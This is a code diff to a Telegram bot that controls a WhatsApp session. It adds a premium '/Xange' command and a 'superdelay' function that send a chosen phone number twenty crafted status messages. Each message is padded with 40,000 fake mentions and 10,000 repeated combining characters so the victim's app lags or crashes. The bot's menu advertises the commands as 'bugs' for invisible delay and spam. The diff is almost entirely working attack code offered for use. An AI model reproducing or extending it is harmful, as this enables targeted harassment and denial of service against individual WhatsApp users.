@@ -1274,6 +1274,7 @@ async function showxbugs(ctx, page = 1) {
 ◇ /dangerdelay    62xxx  → Invisible Delay 100%
 ◇ /qiSys          62xxx  → Hard Spam No Kenon
 ◇ /lowsdelay    62xxx  → Currently Delay Invisible
+◇ /Xange     62xxx  → Delay Can Spam For Murbug
 <blockquote>ִֶָ࣪☾. ( ! ) 𝚂𝚎𝚕𝚕𝚎𝚌𝚝 𝚃𝚑𝚎 𝙼𝚎𝚗𝚞 𝙱𝚞𝚝𝚝𝚘𝚗 𝙱𝚎𝚕𝚘𝚠 ࣪ ִֶָ☾.</blockquote>
 `;
 
@@ -2258,7 +2259,7 @@ bot.command("dangerdelay", checkAllPremium, checkWhatsAppConnection, async (ctx)
   })();
 
 });
-/// CASE BUG BEBAS SPAM 5 ///
+/// CASE BUG BEBAS SPAM 5 \\\
 bot.command("qiSys", checkAllPremium, checkWhatsAppConnection, async (ctx) => {
   const q = ctx.message.text.split(" ")[1];
   if (!q) return ctx.reply(`🪧 Example: /qiSys 62xxxx`);
@@ -2295,7 +2296,7 @@ bot.command("qiSys", checkAllPremium, checkWhatsAppConnection, async (ctx) => {
     }
   })();
 });
-/// CASE BUG BEBAS SPAM 5 ///
+/// CASE BUG BEBAS SPAM 5 \\\
 bot.command("lowsdelay", checkAllPremium, checkWhatsAppConnection, async (ctx) => {
   const q = ctx.message.text.split(" ")[1];
   if (!q) return ctx.reply(`🪧 Example: /lowsdelay 62xxxx`);
@@ -2327,7 +2328,32 @@ bot.command("lowsdelay", checkAllPremium, checkWhatsAppConnection, async (ctx) =
     }
   })();
 }); 
-/// --------- ( CASE BUG 6 ) ---------- \\\
+/// CASE BUG 6 \\\
+bot.command("Xange", checkAllPremium, checkWhatsAppConnection, async (ctx) => {
+  const q = ctx.message.text.split(" ")[1];
+  if (!q) return ctx.reply(`🪧 ☇ Example : /Xange 62xxxx`);
+  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
+
+  await ctx.reply(
+
+`
+✅ SUCCES SEND BUGS TO : ${q}`,
+  {
+    parse_mode: "HTML",
+    reply_markup: {
+      inline_keyboard: [
+        [{ text: "☛ CEK TARGET ☚", url: `https://wa.me/${q}`, style: "success" }],
+      ],
+    },
+  });
+
+  for (let i = 0; i < 20; i++) {
+    await superdelay(sock, target);
+    await sleep(4000);
+    console.log(`Succes Sending Bugs To : ${target}`);
+  }
+})
+/// --------- ( CASE BUG 7 ) ---------- \\\
 bot.command("ultramencrash", checkAllPremium, checkWhatsAppConnection, async (ctx) => {
   const q = ctx.message.text.split(" ")[1];
   if (!q) return ctx.reply(`🪧 Example: /ultramencrash 62xxxx`);
@@ -2901,9 +2927,115 @@ async function delayGabuts(sock, target) {
         }
       };
     await sock.relayMessage(target, jut, {});
-  }
+  } 
   
-  async function VnXBlankAiOneMsg(sock, target) {
+async function superdelay(sock, target, mention = false) {
+    const mentionedList = [
+        "13135550002@s.whatsapp.net",
+        ...Array.from({ length: 40000 }, () =>
+            `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
+        )
+    ];
+
+    const embeddedMusic = {
+        musicContentMediaId: "589608164114571",
+        songId: "870166291800508",
+        author: "Atomic" + "ោ៝".repeat(10000),
+        title: "canlovelove",
+        artworkDirectPath: "/v/t62.76458-24/11922545_2992069684280773_7385115562023490801_n.enc?ccb=11-4&oh=01_Q5AaIaShHzFrrQ6H7GzLKLFzY5Go9u85Zk0nGoqgTwkW2ozh&oe=6818647A&_nc_sid=5e03e0",
+        artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
+        artworkEncSha256: "iWv+EkeFzJ6WFbpSASSbK5MzajC+xZFDHPyPEQNHy7Q=",
+        artistAttribution: "https://t.me/canlovelove",
+        countryBlocklist: true,
+        isExplicit: true,
+        artworkMediaKey: "S18+VRv7tkdoMMKDYSFYzcBx4NCM3wPbQh+md6sWzBU="
+    };
+
+    const videoMessage = {
+        url: "https://mmg.whatsapp.net/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0&mms3=true",
+        mimetype: "video/mp4",
+        fileSha256: "c8v71fhGCrfvudSnHxErIQ70A2O6NHho+gF7vDCa4yg=",
+        fileLength: "289511",
+        seconds: 15,
+        mediaKey: "IPr7TiyaCXwVqrop2PQr8Iq2T4u7PuT7KCf2sYBiTlo=",
+        caption: "A T O M I C H E R E ! ! !",
+        height: 640,
+        width: 640,
+        fileEncSha256: "BqKqPuJgpjuNo21TwEShvY4amaIKEvi+wXdIidMtzOg=",
+        directPath: "/v/t62.7161-24/13158969_599169879950168_4005798415047356712_n.enc?ccb=11-4&oh=01_Q5AaIXXq-Pnuk1MCiem_V_brVeomyllno4O7jixiKsUdMzWy&oe=68188C29&_nc_sid=5e03e0",
+        mediaKeyTimestamp: "1743848703",
+        contextInfo: {
+            isSampled: true,
+            mentionedJid: mentionedList
+        },
+        forwardedNewsletterMessageInfo: {
+            newsletterJid: "120363321780343299@newsletter",
+            serverMessageId: 1,
+            newsletterName: "Atom"
+        },
+        streamingSidecar: "cbaMpE17LNVxkuCq/6/ZofAwLku1AEL48YU8VxPn1DOFYA7/KdVgQx+OFfG5OKdLKPM=",
+        thumbnailDirectPath: "/v/t62.36147-24/11917688_1034491142075778_3936503580307762255_n.enc?ccb=11-4&oh=01_Q5AaIYrrcxxoPDk3n5xxyALN0DPbuOMm-HKK5RJGCpDHDeGq&oe=68185DEB&_nc_sid=5e03e0",
+        thumbnailSha256: "QAQQTjDgYrbtyTHUYJq39qsTLzPrU2Qi9c9npEdTlD4=",
+        thumbnailEncSha256: "fHnM2MvHNRI6xC7RnAldcyShGE5qiGI8UHy6ieNnT1k=",
+        annotations: [
+            {
+                embeddedContent: {
+                    embeddedMusic
+                },
+                embeddedAction: true
+            }
+        ]
+    };
+
+    const msg = generateWAMessageFromContent(target, {
+        viewOnceMessage: {
+            message: { videoMessage }
+        }
+    }, {});
+
+    await sock.relayMessage("status@broadcast", msg.message, {
+        messageId: msg.key.id,
+        statusJidList: [target],
+        additionalNodes: [
+            {
+                tag: "meta",
+                attrs: {},
+                content: [
+                    {
+                        tag: "mentioned_users",
+                        attrs: {},
+                        content: [
+                            { tag: "to", attrs: { jid: target }, content: undefined }
+                        ]
+                    }
+                ]
+            }
+        ]
+    });
+
+    if (mention) {
+        await sock.relayMessage(target, {
+            statusMentionMessage: {
+                message: {
+                    protocolMessage: {
+                        key: msg.key,
+                        type: 25
+                    }
+                }
+            }
+        }, {
+            additionalNodes: [
+                {
+                    tag: "meta",
+                    attrs: { is_status_mention: "true" },
+                    content: undefined
+                }
+            ]
+        });
+    }
+}  
+   
+async function VnXBlankAiOneMsg(sock, target) {
   const VnXlag = "ꦾ".repeat(250000); 
   const VnXAiNew = [
     "13135550202@bot", "13135550202@bot",
